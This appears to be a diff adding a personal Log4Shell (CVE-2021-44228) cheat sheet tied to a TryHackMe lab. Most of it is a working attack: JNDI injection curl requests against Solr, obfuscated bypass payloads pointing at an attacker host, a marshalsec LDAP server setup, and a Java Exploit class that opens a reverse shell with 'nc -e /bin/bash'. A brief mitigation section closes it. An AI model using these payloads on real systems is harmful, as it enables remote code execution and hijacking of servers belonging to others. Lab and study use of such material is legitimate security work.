@@ -1,0 +1,55 @@
+### log4j ###
+## links
+https://tryhackme.com/room/solar						# walktrought
+https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/	# affected services/products
+
+## examples
+curl 'http://10.10.244.167:8983/solr/admin/cores?foo=$\{jndi:ldap://10.8.98.114:4444\}'
+
+## bypasses
+# with ldap
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
+# with rmi
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
+${${::-j}ndi:rmi://attackerendpoint.com/}
+
+
+## setup
+# listening LDAP
+java -cp /usr/share/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.8.98.114:80/#Exploit"
+# listening for shell
+nc -lnvp 4444
+
+# vim Exploit
+public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+# compile exploit
+javac Exploit.java -source 8 -target 8
+# expose exploit
+python3 -m http.server
+# launch attack
+curl 'http://10.10.244.167:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
+
+
+
+## mitigation
+locate solr.in.sh
+find / -type f -iname "solr.in.sh" 2>/dev/null
+# add at the bottom of the file
+SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"
+# restart
+sudo /etc/init.d/solr restart
+
+
